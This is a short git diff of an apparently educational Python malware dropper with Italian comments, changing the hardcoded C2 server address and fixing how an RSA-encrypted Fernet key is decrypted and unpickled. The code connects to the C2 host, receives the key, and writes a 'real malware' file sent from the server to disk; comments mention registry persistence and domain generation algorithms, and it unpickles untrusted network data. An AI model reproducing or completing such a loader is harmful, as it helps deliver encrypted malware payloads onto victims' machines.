@@ -58,8 +58,8 @@ if __name__ == '__main__':
     #     print("Chiave di registro già presente")
 
     # connessione al server C2
-    ip_server = "192.168.43.208"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
-    port_server = 65432
+    ip_server = "192.168.1.15"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
+    port_server = 65438
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print("Tentativo di connessione al server C2...")
     server.connect((ip_server, port_server))
@@ -75,9 +75,10 @@ if __name__ == '__main__':
 
     with open(path_real_malware_from_C2, "wb") as malware_from_C2:
         byte_key = server.recv(BUFFER_SIZE)
-        key = rsa.decrypt(pickle.loads(byte_key), privateKey)
-        symmetric_key = Fernet(key)
-        print("Chiave simmetrica ricevuta: {}".format(str(byte_key)))
+        key = rsa.decrypt(byte_key, privateKey)
+        decyphered_key = pickle.loads(key)
+        symmetric_key = Fernet(decyphered_key)
+        print("Chiave simmetrica ricevuta: {}".format(str(decyphered_key)))
         bytes_read = b""
         server.send("Ok".encode("utf8"))
         # leggo la dimensione del file da ricevere
